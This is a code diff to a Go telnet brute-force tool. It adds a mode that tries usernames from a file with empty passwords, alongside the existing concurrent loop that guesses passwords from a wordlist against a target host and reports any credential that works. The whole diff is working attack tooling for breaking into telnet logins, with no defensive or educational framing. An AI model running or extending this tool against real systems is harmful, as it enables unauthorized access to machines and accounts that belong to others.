@@ -27,6 +27,7 @@ func main() {
 	var passwordsFile string
 	var numThreads int
 	var verboseFlag bool
+	var usernamesFile string
 
 	flag.StringVar(&targetIp, "target", "", "The host which is running a brute-forcable telnet instance. [REQUIRED]")
 	flag.StringVar(&targetIp, "t", "", "The host which is running a brute-forcable telnet instance. [REQUIRED]")
@@ -40,6 +41,8 @@ func main() {
 	flag.StringVar(&passwordsFile, "p", "", "File location of a newline sperated password-candidate list. [REQUIRED]")
 	flag.BoolVar(&verboseFlag, "verbose", false, "Enable more verbose output.")
 	flag.BoolVar(&verboseFlag, "v", false, "Enable more verbose output.")
+	flag.StringVar(&usernamesFile, "userFile", "", "Take in a file of usernames, switchese to user enumeration for nopass login. [OVERRIDES PASSWORDSFILE]")
+	flag.StringVar(&usernamesFile, "uf", "", "Take in a file of usernames, switchese to user enumeration for nopass login. [OVERRIDES PASSWORDSFILE]")
 
 	flag.Usage = func() {
 		fmt.Printf("Usage of %s:\n", os.Args[0])
@@ -54,6 +57,7 @@ func main() {
 			[]string{"", "Optionals:"},
 			[]string{"port", "pn"},
 			[]string{"conn", "c"},
+			[]string{"userFile", "uf"},
 			[]string{"verbose", "v"}}
 
 		for _, set := range order {
@@ -74,38 +78,67 @@ func main() {
 		verbose = false
 	}
 
-	passwords, err := readPasswords(passwordsFile)
-	if err != nil {
-		fmt.Println("Error reading passwords file:", err)
-		return
+	if usernamesFile == "" {
+		passwords, err := readFileEntries(passwordsFile)
+		if err != nil {
+			fmt.Println("Error reading passwords file:", err)
+			return
+		}
+		wg := new(sync.WaitGroup)
+		sem := make(chan struct{}, numThreads)
+
+		wg.Add(len(passwords))
+
+		verbPrint("Brute-forcing telnet login for username: %s" + username + "\n\n")
+
+		for _, password := range passwords {
+			go func(password string) {
+				defer wg.Done()
+				sem <- struct{}{}
+				if attemptLogin(username, password, targetIp, targetPort) {
+					fmt.Println("")
+					fmt.Printf("[+] Password found: %s\n", password)
+					os.Exit(0) // we found it, get the heck outta here!
+				} else {
+					fmt.Print("* ")
+					verbPrint("Attempted: " + password)
+				}
+				<-sem
+			}(password)
+		}
+		wg.Wait()
+	} else {
+		usernames, err := readFileEntries(usernamesFile)
+		if err != nil {
+			fmt.Println("Error reading usernames file:", err)
+			return
+		}
+		wg := new(sync.WaitGroup)
+		sem := make(chan struct{}, numThreads)
+
+		wg.Add(len(usernames))
+
+		verbPrint("Brute-forcing telnet login for username: %s" + username + "\n\n")
+
+		for _, password := range usernames {
+			go func(user string) {
+				defer wg.Done()
+				sem <- struct{}{}
+				if attemptLogin(user, "", targetIp, targetPort) {
+					fmt.Println("")
+					fmt.Printf("[+] Valid nopass user found: %s\n", user)
+					os.Exit(0) // we found it, get the heck outta here!
+				} else {
+					fmt.Print("* ")
+					verbPrint("Attempted: " + user)
+				}
+				<-sem
+			}(password)
+		}
+		wg.Wait()
 	}
 
-	wg := new(sync.WaitGroup)
-	sem := make(chan struct{}, numThreads)
-
-	wg.Add(len(passwords))
-
-	verbPrint("Brute-forcing telnet login for username: %s" + username + "\n\n")
-
-	for _, password := range passwords {
-		go func(password string) {
-			defer wg.Done()
-			sem <- struct{}{}
-			if attemptLogin(username, password, targetIp, targetPort) {
-				fmt.Println("")
-				fmt.Printf("[+] Password found: %s\n", password)
-				os.Exit(0) // we found it, get the heck outta here!
-			} else {
-				fmt.Print("* ")
-				verbPrint("Attempted: " + password)
-			}
-			<-sem
-		}(password)
-	}
-
-	wg.Wait()
-
-	fmt.Println("All password attempts finished.")
+	fmt.Println("Operation finished...")
 	os.Exit(0)
 }
 
@@ -152,17 +185,17 @@ func attemptLogin(username, password string, theIp string, thePort string) bool 
 	return false
 }
 
-func readPasswords(filename string) ([]string, error) {
+func readFileEntries(filename string) ([]string, error) {
 	file, err := os.Open(filename)
 	if err != nil {
 		return nil, err
 	}
 	defer file.Close()
 
-	var passwords []string
+	var entries []string
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
-		passwords = append(passwords, scanner.Text())
+		entries = append(entries, scanner.Text())
 	}
-	return passwords, scanner.Err()
+	return entries, scanner.Err()
 }
